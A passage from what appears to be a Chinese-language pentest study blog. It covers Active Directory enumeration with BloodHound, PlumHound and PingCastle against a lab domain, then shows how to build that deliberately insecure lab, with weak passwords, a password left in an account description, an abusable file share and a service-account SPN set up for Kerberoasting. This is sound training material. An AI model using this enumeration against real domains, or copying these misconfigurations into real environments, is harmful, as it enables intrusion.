<p>3、domain_computers: 目標網域的電腦帳號列表</p>
<p>4、domain_policy: 網域原則，例如是否需要密碼等</p>
<p>5、domain_trusts: 傳入和傳出域屬性以及是否受信任</p>
<h2 id="Domain-Enumeration-with-Bloodhound"><a href="#Domain-Enumeration-with-Bloodhound" class="headerlink" title="Domain Enumeration with Bloodhound"></a><strong>Domain Enumeration with Bloodhound</strong></h2><ul>
<li>install bloodhound</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound</a></p>
<p><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/m/articles/10334679">https://ithelp.ithome.com.tw/m/articles/10334679</a></p>
<ul>
<li>資料視覺化工具</li>
<li>這意味著沒有任何資料根本沒有用</li>
<li>擅長視覺化 Active Directory 物件關係以及這些關係之間的各種權限</li>
<li>可顯示 Active Directory 環境中的潛在攻擊路徑。</li>
<li>使用圖論並直觀地映射使用者帳戶、群組和其他 Active Directory 網路元件之間的關係</li>
<li>您可以使用 BloodHound 的 GUI 分析此訊息，以發現安全性設定錯誤</li>
<li>自動收集 Active Directory 環境資訊。</li>
<li>建立 Active Directory 環境的視覺化圖表。</li>
<li>分析 Active Directory 資訊並識別潛在的攻擊路徑。</li>
<li>自訂查詢語言 (Cypher)，可讓您搜尋安全漏洞和攻擊路徑。</li>
<li>能夠根據調查結果建立報告和文件。</li>
<li>BloodHoundAD 分析可以標準化為一種報告格式，可用於有關修正常見 Active Directory 控制路徑漏洞的資料驅動決策。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/bloodhound]</span><br><span class="line">└─# **pip install bloodhound**          <span class="comment">#這沒下載會無法用bloodhound-python</span></span><br><span class="line">Collecting bloodhound</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **neo4j console <span class="comment">#一定要先設定好，預設帳密 neo4j/neo4j 登入成功才能改密碼**</span></span><br><span class="line">Directories <span class="keyword">in</span> use:</span><br><span class="line">home:         /usr/share/neo4j</span><br><span class="line">config:       /usr/share/neo4j/conf</span><br><span class="line">logs:         /etc/neo4j/logs</span><br><span class="line">plugins:      /usr/share/neo4j/plugins</span><br><span class="line">import:       /usr/share/neo4j/import</span><br><span class="line">data:         /etc/neo4j/data</span><br><span class="line">certificates: /usr/share/neo4j/certificates</span><br><span class="line">licenses:     /usr/share/neo4j/licenses</span><br><span class="line">run:          /var/lib/neo4j/run</span><br><span class="line">Starting Neo4j.</span><br><span class="line">...</span><br><span class="line">2024-02-24 14:53:20.328+0000 INFO  Remote interface available at http://localhost:7474/</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">****</span><br></pre></td></tr></table></figure>

<p><code>-d</code> 設置網域，<code>-u</code>設置登入的使用者，<code>-p</code>設置登入密碼，<code>-gc</code>設置主機，<code>-c</code>設置要收集的方法，包含Group、LocalAdmin、Session、Trusts、Default (all previous)、DCOnly (no computer connections)、DCOM、RDP、PSRemote、LoggedOn、Container、ObjectProps、ACL、All，<code>-ns</code>設置名稱伺服器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **bloodhound <span class="comment">#依據neo4j設定帳密登入**</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/bloodhound]</span><br><span class="line">└─# **<span class="built_in">sudo</span> bloodhound-python -d MARVEL.<span class="built_in">local</span> -u fcastle -p Password1 -ns 192.168.19.140 -c all**</span><br><span class="line">INFO: Found AD domain: marvel.local</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: hydra-dc.marvel.local</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 3 computers</span><br><span class="line">INFO: Connecting to LDAP server: hydra-dc.marvel.local</span><br><span class="line">INFO: Found 10 <span class="built_in">users</span></span><br><span class="line">INFO: Found 52 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 3 gpos</span><br><span class="line">INFO: Found 2 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: SPIDERMAN.MARVEL.<span class="built_in">local</span></span><br><span class="line">INFO: Querying computer: THEPUNISHER.MARVEL.<span class="built_in">local</span></span><br><span class="line">INFO: Querying computer: HYDRA-DC.MARVEL.<span class="built_in">local</span></span><br><span class="line">INFO: Skipping enumeration <span class="keyword">for</span> SPIDERMAN.MARVEL.<span class="built_in">local</span> since it could not be resolved.</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 02S</span><br></pre></td></tr></table></figure>

<p>執行完成後，就會輸出幾個json檔，將這些檔案上傳bloodhound。</p>
<p>按住shift一次選取全部</p>
<p><img src="/img/ADEmum_Untitled_1.png" alt="Untitled"></p>
<p>點選Analysis &gt;點選想要查看的資訊，選擇出現的圖示查看相關內容</p>
<p>通過查看Analysis的各種內容，可以發現各種可能洩漏得資訊，從而知道可以利用甚麼漏洞進行攻擊</p>
<p><img src="/img/ADEmum_Untitled_2.png" alt="Untitled"></p>
<p><img src="/img/ADEmum_Untitled_3.png" alt="Untitled"></p>
<h2 id="Domain-Enumeration-with-Plumhound"><a href="#Domain-Enumeration-with-Plumhound" class="headerlink" title="Domain Enumeration with Plumhound"></a><strong>Domain Enumeration with Plumhound</strong></h2><p><a target="_blank" rel="noopener" href="https://github.com/PlumHound/PlumHound">https://github.com/PlumHound/PlumHound</a></p>
<p><a target="_blank" rel="noopener" href="https://www.blackhillsinfosec.com/plumhound-reporting-engine-for-bloodhoundad/">https://www.blackhillsinfosec.com/plumhound-reporting-engine-for-bloodhoundad/</a></p>
<p>PlumHound 的框架</p>
<ul>
<li>BloodHoundAD 的報告引擎，可為藍隊、系統管理員和分析師提供可操作的報告。</li>
<li>利用 Neo4j 中 BloodHoundAD 的控制路徑查找功能為藍隊建立可操作的情報，以識別 Active Directory 問題。</li>
<li>操作<ul>
<li>指定 Neo4j 資料庫連線並指定您想要執行的「task-list」。</li>
<li>task-list是cypher queries和metadata 的集合，它們告訴 PlumHound 要執行什麼查詢以及如何從輸出產生報表。</li>
<li>PlumHound 隨附的「預設」任務清單包括 69 份報表和一個index。</li>
</ul>
</li>
</ul>
<p>它可以視覺化複雜的 Active Directory 結構、尋找可能的攻擊路徑並提供環境的良好概述</p>
<p>BloodHound CE GUI 非常適合辨識攻擊路徑或尋找有趣的目標。</p>
<ul>
<li>概述了所有 AD 物件及其相互之間的關係</li>
<li>對於每個對象，都有大量資訊可用且可以視覺化，例如<em>使用者可以透過 RDP 連接到哪些主機？使用者擁有哪些物件控制項？</em></li>
<li>GUI 的最大優點是視覺化更長的鏈，並能夠輕鬆查看如何利用鏈中的每個關係</li>
</ul>
<p>如果 Neo4j 伺服器位於本機上，不需要指定 Neo4j 連線</p>
<p>另一種存取 BloodHound 資料的方法是直接透過 neo4j。資料無法像 GUI 那樣視覺化</p>
<p>但對於某些用例，基於原始文字的結果</p>
<p>此外，Web 介面中還提供了將資料匯出為 csv 檔案的選項，這對於向客戶提供有關受影響資源（如果受影響資源較多）的資訊非常有用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/PlumHound]</span><br><span class="line">└─# **python3 PlumHound.py --easy -p kali** </span><br><span class="line"></span><br><span class="line">        PlumHound 1.6</span><br><span class="line">        For more information: https://github.com/plumhound</span><br><span class="line">        --------------------------------------</span><br><span class="line">        Server: bolt://localhost:7687</span><br><span class="line">        User: neo4j</span><br><span class="line">        Password: *****</span><br><span class="line">        Encryption: False</span><br><span class="line">        Timeout: 300</span><br><span class="line">        --------------------------------------</span><br><span class="line">        Task: Easy</span><br><span class="line">        Query Title: Domain Users</span><br><span class="line">        Query Format: STDOUT</span><br><span class="line">        Query Cypher: MATCH (n:User) RETURN n.name, n.displayname</span><br><span class="line">        --------------------------------------</span><br><span class="line">INFO    Found 1 task(s)</span><br><span class="line">INFO    --------------------------------------</span><br><span class="line"> .....</span><br><span class="line">      ADMINISTRATOR@MARVEL.LOCAL</span><br><span class="line">      TSTARK@MARVEL.LOCAL         Tony Stark</span><br><span class="line">      SQLSERVICE@MARVEL.LOCAL     SQLService</span><br><span class="line">      FCASTLE@MARVEL.LOCAL        Frank Castle</span><br><span class="line">      RKXJHDREXH@MARVEL.LOCAL     rkxJHDREXh</span><br><span class="line">      QDPZDMZFFY@MARVEL.LOCAL     QdPzdMZFFY</span><br><span class="line">      PPARKER@MARVEL.LOCAL        Peter Parker</span><br><span class="line">      KRBTGT@MARVEL.LOCAL</span><br><span class="line">      GUEST@MARVEL.LOCAL</span><br><span class="line">on 1: </span><br><span class="line">         Executing Tasks |██████████████████████████████████████████████████| Tasks 1 / 1  <span class="keyword">in</span> 2.4s</span><br><span class="line"></span><br><span class="line">        Completed 1 of 1 tasks.</span><br><span class="line"></span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound]</span><br><span class="line">└─# **python3 PlumHound.py -x tasks/default.tasks -p kali**</span><br><span class="line"></span><br><span class="line">        PlumHound 1.6</span><br><span class="line">        For more information: https://github.com/plumhound</span><br><span class="line">        --------------------------------------</span><br><span class="line">        Server: bolt://localhost:7687</span><br><span class="line">        User: neo4j</span><br><span class="line">        Password: *****</span><br><span class="line">        Encryption: False</span><br><span class="line">        Timeout: 300</span><br><span class="line">        --------------------------------------</span><br><span class="line">        Tasks: Task File</span><br><span class="line">        TaskFile: tasks/default.tasks</span><br><span class="line">        Found 88 task(s)</span><br><span class="line">        --------------------------------------</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound]</span><br><span class="line">└─# <span class="built_in">cd</span> reports  </span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">AdminGroups.csv                              LapsDeploymentCount-OS.html</span><br><span class="line">AdminGroups.html                             LAPSNotEnabled.html</span><br><span class="line">AdminsWithoutSensitiveFlag.html.csv          LocalAdmin_Groups_Count.html</span><br><span class="line">AdminsWithoutSensitiveFlag.html.html         LocalAdmin_Groups.html</span><br><span class="line">CertificateAuthorties.csv                    LocalAdmin_UsersCount.html</span><br><span class="line">CertificateAuthorties.html                   LocalAdmin_Users.html</span><br><span class="line">CertificateTemplateEnrollRights.csv          OperatingSystemCount.html</span><br><span class="line">CertificateTemplateEnrollRights.html         OperatingSystemUnsupported.csv</span><br><span class="line">CertificateTemplates.csv                     OperatingSystemUnsupported.html</span><br><span class="line">CertificateTemplates_ESC1.csv                OUs_Count.html</span><br><span class="line">CertificateTemplates_ESC1.html               Owned-Computers-Groups.html</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# **firefox index.html**          </span><br></pre></td></tr></table></figure>

<p><img src="/img/ADEmum_Untitled_4.png" alt="Untitled"></p>
<p>firefox進程被占用無法開啟html檔案</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# **ps -u root | grep firefox**</span><br><span class="line"> 704533 pts/1    00:01:54 firefox-esr</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# **<span class="built_in">kill</span> -9 704533**</span><br><span class="line">                                                                                           </span><br><span class="line">[2]  + killed     firefox domain_users_by_group.html</span><br><span class="line">┌──(root㉿kali)-[/opt/PlumHound/reports]</span><br><span class="line">└─# **firefox index.html**           </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>許多工具都能夠為給定網域產生使用者列表，但使用 BloodHound CE API 或 neo4j 資料庫有一個很大的優勢：能夠過濾特定條件。</p>
<p>根據特定標準，可以篩選出最感興趣的使用者或可能會取得最大成功的使用者。腳本產生 4 個使用者檔案：</p>
<ul>
<li>enabledUsers.txt</li>
<li>enabledTierZeroUsers.txt</li>
<li>enabledInactiveUsers.txt</li>
<li>enabledPotentialAdminUsers.txt</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.8com.de/cyber-security-blog/bloodhound-ce-and-automating-parts-of-ad-pentests">https://www.8com.de/cyber-security-blog/bloodhound-ce-and-automating-parts-of-ad-pentests</a></p>
<h2 id="Domain-Enumeration-with-PingCastle"><a href="#Domain-Enumeration-with-PingCastle" class="headerlink" title="Domain Enumeration with PingCastle"></a><strong>Domain Enumeration with PingCastle</strong></h2><p><a target="_blank" rel="noopener" href="https://www.pingcastle.com/download/">https://www.pingcastle.com/download/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/pingcastle/">https://www.ddosi.org/pingcastle/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Ping_Pig/article/details/109286621">https://blog.csdn.net/Ping_Pig&#x2F;article&#x2F;details&#x2F;109286621</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@jshake/pingcastle-vs-purple-knight-active-directory-security-b818fa7fc36d">https:&#x2F;&#x2F;medium.com&#x2F;@jshake&#x2F;pingcastle-vs-purple-knight-active-directory-security-b818fa7fc36d</a></p>
<p>加入到您想要評估的 Active Directory 環境的電腦上執行 PingCastle.exe 程式</p>
<p><img src="/img/ADEmum_Untitled_5.png" alt="Untitled"></p>
<p>1-healthcheck-對域的風險進行評分</p>
<ul>
<li>在幾分鐘的時間內，它會產生一個報告，給你一個Active Directory安全性的概覽。透過使用現有的信任鏈接，可以在其他網域上產生此報告。</li>
</ul>
<p>2-conso -將多份報表聚合為單一報表</p>
<ul>
<li>有了許多健康檢查報告，您可以獲得整個範圍的單一報告。將生成地圖。</li>
</ul>
<p>3-carto -建構所有互聯域的映射</p>
<ul>
<li>它合併了將在所有受信任網域上運行的健康檢查報告，然後是conso選項。但是更輕，然後更快。</li>
</ul>
<p>4-scanner -對工作站進行特定的安全檢查</p>
<ul>
<li>您可以知道您的本機管理員，如果Bitlocker配置正確，發現不保護的共享，…一個選單將顯示選擇正確的掃描器。</li>
</ul>
<p>5-export -匯出使用者或計算機</p>
<ul>
<li>不要涉及您的管理員，取得您想要獲得的使用者或電腦清單。將顯示一個選單來選擇匯出。</li>
</ul>
<p>6-advanced -開啟進階選單</p>
<ul>
<li>這是您希望在不使用命令列開關的情況下配置PingCastle的地方。</li>
</ul>
<p>必須在ad網域下的用戶，點擊exe檔案執行，並在第一個選項按enter再次按enter後，如果正常運行會跑出.local檔案</p>
<p><img src="/img/ADEmum_Untitled_6.png" alt="Untitled"></p>
<p>僅參考</p>
<p>雙擊點開該檔案會看到該網域的風險值…可以看到各種對於該網域有的風險甚至進行利用..</p>
<p>打開 HTML 報告後，了解評分非常重要。高分域名&#x3D;高風險。領域風險等級有一個總分，等於 4 個子分數中最差的分數。</p>
<p>滿分 100 分，4 個分項部分分別是<strong>特權帳號、信任、過時物件</strong>和<strong>安全異常</strong>。每個小節都會有描述和找到的“規則”，並根據規則的重要性給予不同的分數。</p>
<p><img src="/img/ADEmum_Untitled_7.png" alt="Untitled"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-AD LAB build" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/AD%20LAB%20build/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.071Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/AD%20LAB%20build/">
        AD LAB Build
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="AD-LAB-Build"><a href="#AD-LAB-Build" class="headerlink" title="AD LAB Build"></a>AD LAB Build</h1><p><a target="_blank" rel="noopener" href="https://github.com/Dewalt-arch/pimpmyadlab">https://github.com/Dewalt-arch/pimpmyadlab</a></p>
<hr>
<h2 id="Lab-Overview-and-Requirements"><a href="#Lab-Overview-and-Requirements" class="headerlink" title="Lab Overview and Requirements"></a><strong>Lab Overview and Requirements</strong></h2><p>one windows server - server 2022</p>
<p>two windows 10 workstations</p>
<h3 id="Lab-Build-Cloud-Alternative"><a href="#Lab-Build-Cloud-Alternative" class="headerlink" title="Lab Build - (Cloud Alternative)"></a><strong>Lab Build - (Cloud Alternative)</strong></h3><p>Building Free Active Directory Lab in Azure - <a target="_blank" rel="noopener" href="https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f">https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f</a></p>
<p>going to be building the lab in the cloud using Azure</p>
<ul>
<li>It need to cost money..</li>
</ul>
<h3 id="Downloading-Necessary-ISOs"><a href="#Downloading-Necessary-ISOs" class="headerlink" title="Downloading Necessary ISOs"></a><strong>Downloading Necessary ISOs</strong></h3><p><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/evalcenter">https://www.microsoft.com/en-us/evalcenter</a></p>
<ul>
<li>免費的話每三十分鐘會關機</li>
</ul>
<p>下載這兩個iso</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://info.microsoft.com/ww-landing-windows-10-enterprise.html">Windows 10 Enterprise Trial (microsoft.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://info.microsoft.com/ww-landing-windows-server-2022.html">Windows Server 2022 Trial (microsoft.com)</a></li>
</ul>
<table>
<thead>
<tr>
<th>Windows 10 Enterprise</th>
<th>XGVPP-NMH47-7TTHJ-W3FW7-8HV2C</th>
</tr>
</thead>
</table>
<p>vm 卡在BIOS&gt;</p>
<ul>
<li>記得改選項</li>
</ul>
<p><img src="/img/ADLAB_Untitled.png" alt="Untitled"></p>
<h2 id="Windows-server-setting-Domain-Controller"><a href="#Windows-server-setting-Domain-Controller" class="headerlink" title="Windows server setting - Domain Controller"></a>Windows server setting - Domain Controller</h2><p>Win Server &gt; choose 2&gt;I accept &gt;Custom&gt;click new&gt;Apply&gt;next&gt;</p>
<p><img src="/img/ADLAB_Untitled_1.png" alt="Untitled"></p>
<p>Customize setting &gt; P@$$w0rd! &gt; setup</p>
<ul>
<li>passwd → Akali@</li>
</ul>
<p><img src="/img/ADLAB_Untitled_2.png" alt="Untitled"></p>
<p>先對 WinServer 進行命名</p>
<p>可以再搜索框直接打name &gt; View your PC name &gt; Rename this PC&gt;設定任何名稱可以識別即可</p>
<p><img src="/img/ADLAB_Untitled_3.png" alt="Untitled"></p>
<h3 id="Make-this-a-domain-controller"><a href="#Make-this-a-domain-controller" class="headerlink" title="Make this a domain controller"></a>Make this a domain controller</h3><p><img src="/img/ADLAB_Untitled_4.png" alt="Untitled"></p>
<p>Server manager &gt; Manage &gt; Add Roles and Features &gt; next &gt; next &gt; 打勾 Active Directory Domain Service &gt;next&gt;next&gt;next&gt;打勾 Restart the destination server automatically &gt; Install </p>
<p>下載後會出現Promote this server to …，點擊進去</p>
<p><img src="/img/ADLAB_Untitled_5.png" alt="Untitled"></p>
<ul>
<li>Add a new forest<ul>
<li>cause we don’t have an existing domain and new domain to an existing forest</li>
</ul>
</li>
</ul>
<p>gonna create own forest, but this forest is gonna have one little domain in it </p>
<ul>
<li>finish fill the domain name &gt; click next</li>
</ul>
<p><img src="/img/ADLAB_Untitled_6.png" alt="Untitled"></p>
<p>Setting up a functional level</p>
<ul>
<li>Password</li>
</ul>
<p><img src="/img/ADLAB_Untitled_7.png" alt="Untitled"></p>
<p>next &gt; next&gt;這邊會生成domain name&gt;next&gt;next&gt;next</p>
<p><img src="/img/ADLAB_Untitled_8.png" alt="Untitled"></p>
<p>最後都設定好就直接下載</p>
<p><img src="/img/ADLAB_Untitled_9.png" alt="Untitled"></p>
<p>重開機後登入新的domain account</p>
<h3 id="Set-up-certificate-services"><a href="#Set-up-certificate-services" class="headerlink" title="Set up certificate services"></a>Set up certificate services</h3><ul>
<li>used to verify identities in a domain controller &gt; enhanced security</li>
<li>allow us used LDAP secure or LDAP s</li>
<li>LDAP is truly your phone book, lightweight Directory access protocol</li>
<li>want to add security or basic feature, make sure you’re implementing certificate services</li>
</ul>
<p>Server manager &gt; Manage &gt; Add Roles and Features &gt; next &gt; next &gt; 打勾Active Directory Certificate Services </p>
<p><img src="/img/ADLAB_Untitled_10.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_11.png" alt="Untitled"></p>
<p>next&gt;next&gt;next&gt;打勾 Restart the destination server automatically &gt; Install </p>
<p>下載完後進入設定</p>
<p><img src="/img/ADLAB_Untitled_12.png" alt="Untitled"></p>
<p>next &gt; check Certification Authority &gt; next&gt;next&gt;next&gt;next&gt;next&gt; change 99 year&gt;next&gt;configure </p>
<p>then reboot server </p>
<p><img src="/img/ADLAB_Untitled_13.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_14.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_15.png" alt="Untitled"></p>
<h3 id="Windows-10-setting-User-Machines-2"><a href="#Windows-10-setting-User-Machines-2" class="headerlink" title="Windows 10 setting- User Machines *2"></a>Windows 10 setting- User Machines *2</h3><p>在設定vm時記得要修改成Enterprise</p>
<p><img src="/img/ADLAB_Untitled_16.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_17.png" alt="Untitled"></p>
<p>兩台的vm設置相同，跟前面server的安裝過程一樣</p>
<p>選擇Domain join instead </p>
<p>陸續輸入帳號密碼，密碼一率都輸入Akali@</p>
<p><img src="/img/ADLAB_Untitled_18.png" alt="Untitled"></p>
<p>取消勾選所有選項</p>
<p><img src="/img/ADLAB_Untitled_19.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_20.png" alt="Untitled"></p>
<p>下載vm tool &gt; 設定主機名稱</p>
<p>重開機</p>
<hr>
<h2 id="Setting-Up-Users-Groups-and-Policies"><a href="#Setting-Up-Users-Groups-and-Policies" class="headerlink" title="Setting Up Users, Groups, and Policies"></a><strong>Setting Up Users, Groups, and Policies</strong></h2><p>modifying the domain controller and setting up some users, groups and policies</p>
<ul>
<li>adding users、look at OU、objects、domain policies</li>
<li>stores all of users and computers</li>
<li>here can see different OU</li>
</ul>
<p><img src="/img/ADLAB_Untitled_21.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_22.png" alt="Untitled"></p>
<ul>
<li><p>see the computer that are joined to the domain</p>
</li>
<li><p>see what users exist</p>
<p>  <img src="/img/ADLAB_Untitled_23.png" alt="Untitled"></p>
<ul>
<li>enterprise admins</li>
<li>domain admins</li>
<li>some of the important groups</li>
<li>good for us an attack<ul>
<li>compromise domain admin</li>
<li>enterprise admin..</li>
</ul>
</li>
</ul>
</li>
<li><p>separate these out</p>
</li>
</ul>
<p><img src="/img/ADLAB_Untitled_24.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_25.png" alt="Untitled"></p>
<ul>
<li>move that into groups &gt; click Don’t show this…</li>
</ul>
<p><img src="/img/ADLAB_Untitled_26.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_27.png" alt="Untitled"></p>
<p>So the only account that we have to login into domain </p>
<p><img src="/img/ADLAB_Untitled_28.png" alt="Untitled"></p>
<ul>
<li>creat other administrator<ul>
<li>copy that administrator</li>
<li>It will copy all of the permissions that the administrator has</li>
<li>可以查看administrator有什麼權限..</li>
</ul>
</li>
</ul>
<p><img src="/img/ADLAB_Untitled_29.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_30.png" alt="Untitled"></p>
<p>copy後填入用戶訊息 &gt; tstark &gt; passwd &gt; Akali@@</p>
<p><img src="/img/ADLAB_Untitled_31.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_32.png" alt="Untitled"></p>
<p>Create a service and account that is a domain administrator</p>
<ul>
<li>SQLService &gt; password &gt; MYpassword123#</li>
<li>run as domain admin</li>
<li>名字間不要有空格</li>
</ul>
<p><img src="/img/ADLAB_Untitled_33.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_34.png" alt="Untitled"></p>
<p>很多管理員會在Description留下機敏資訊，這邊模擬他們的行為</p>
<p><img src="/img/ADLAB_Untitled_35.png" alt="Untitled"></p>
<p>再創兩個低權限用戶在domain user group</p>
<p><img src="/img/ADLAB_Untitled_36.png" alt="Untitled"></p>
<ul>
<li>fcastle &gt; Password1</li>
</ul>
<p><img src="/img/ADLAB_Untitled_37.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_38.png" alt="Untitled"></p>
<p>從前面可以看到許多不安全設定</p>
<p>複製Frank用戶設定</p>
<p><img src="/img/ADLAB_Untitled_39.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_40.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_41.png" alt="Untitled"></p>
<p>全部設定完長這樣</p>
<p><img src="/img/ADLAB_Untitled_42.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WinServer -&gt;</span><br><span class="line">DC name -  HYDRA-DC</span><br><span class="line">Forest - MARVEL.<span class="built_in">local</span></span><br><span class="line"></span><br><span class="line">useradd -&gt;</span><br><span class="line">+ admin -&gt;</span><br><span class="line">	+ Tony Stark -&gt;</span><br><span class="line">		+ logon name - tstark</span><br><span class="line">		+ passwd - Akali@@</span><br><span class="line">	+ SQLService -&gt;</span><br><span class="line">		+ logon name - SQLService</span><br><span class="line">		+ passwd -&gt; MYpassword123#</span><br><span class="line">		+ description leak the passwd</span><br><span class="line"></span><br><span class="line">+ user -&gt;</span><br><span class="line">	+ Frank Castle - &gt;</span><br><span class="line">		+ logon name - fcastle</span><br><span class="line">		+ passwd - Password1</span><br><span class="line">	+ Peter Parker -&gt;</span><br><span class="line">		+ logon name - pparker</span><br><span class="line">		+ passwd - Akali@@</span><br></pre></td></tr></table></figure>

<p>Create a file share &gt; abuse later on</p>
<ul>
<li>File and Storage Services &gt;Share &gt; New Share &gt; next &gt; next</li>
</ul>
<p><img src="/img/ADLAB_Untitled_43.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_44.png" alt="Untitled"></p>
<p>have a remote path for us of Hydro DC hackme &gt; next&gt;next&gt;create</p>
<p><img src="/img/ADLAB_Untitled_45.png" alt="Untitled"></p>
<p><img src="/img/ADLAB_Untitled_46.png" alt="Untitled"></p>
<p>Setup the service account fully that we had before</p>
<p>開啟CMD並用管理員身分運行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Microsoft Windows [Version 10.0.20348.587]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;**setspn -a HYDRA-DC/SQLService.MARVEL.<span class="built_in">local</span>:60111 MARVEL\SQLService</span><br><span class="line">Checking domain DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line"></span><br><span class="line">Registering ServicePrincipalNames <span class="keyword">for</span> CN=SQL Service,CN=Users,DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">        HYDRA-DC/SQLService.MARVEL.<span class="built_in">local</span>:60111</span><br><span class="line">Updated object**</span><br></pre></td></tr></table></figure>

<ul>
<li>MARVEL.local 網域中名為 HYDRA-DC 的伺服器上執行的服務新增服務主體名稱 (SPN)</li>
</ul>
<p>如果要使用 Active Directory 作為 Kerberos 實作，請使用 <code>setspn</code> 指令來登錄 SPN。 要執行此指令，必須滿足下列條件：</p>
<ul>
<li>您必須登入到網域控制站</li>
<li>您必須使用提升的特權（以管理者身分執行）來執行命令提示字元</li>
<li>您必須是 Domain Admins 群組的成員（或者網域管理者已授予您適當的許可權）</li>
</ul>
<p>此命令將傳回在 MARVEL.local 網域中註冊的所有 SPN 的列表，以及關聯的服務類別和伺服器名稱。它對於解決 SPN 相關問題或驗證網域中配置的 SPN 非常有用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;**setspn -T MARVEL.<span class="built_in">local</span> -Q */***</span><br><span class="line">Checking domain DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">CN=HYDRA-DC,OU=Domain Controllers,DC=MARVEL,DC=<span class="built_in">local</span></span><br><span class="line">        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/HYDRA-DC.MARVEL.<span class="built_in">local</span></span><br><span class="line">        ldap/HYDRA-DC.MARVEL.<span class="built_in">local</span>/ForestDnsZones.MARVEL.<span class="built_in">local</span></span><br><span class="line">        ldap/HYDRA-DC.MARVEL.<span class="built_in">local</span>/DomainDnsZones.MARVEL.<span class="built_in">local</span></span><br><span class="line">        DNS/HYDRA-DC.MARVEL.<span class="built_in">local</span></span><br><span class="line">        GC/HYDRA-DC.MARVEL.<span class="built_in">local</span>/MARVEL.<span class="built_in">local</span></span><br><span class="line">        RestrictedKrbHost/HYDRA-DC.MARVEL.<span class="built_in">local</span></span><br><span class="line">        RestrictedKrbHost/HYDRA-DC</span><br><span class="line">        RPC/ff28a91a-7cfe-4680-84a0-e7ccfe7f8feb._msdcs.MARVEL.<span class="built_in">local</span></span><br><span class="line">        HOST/HYDRA-DC/MARVEL</span><br><span class="line">        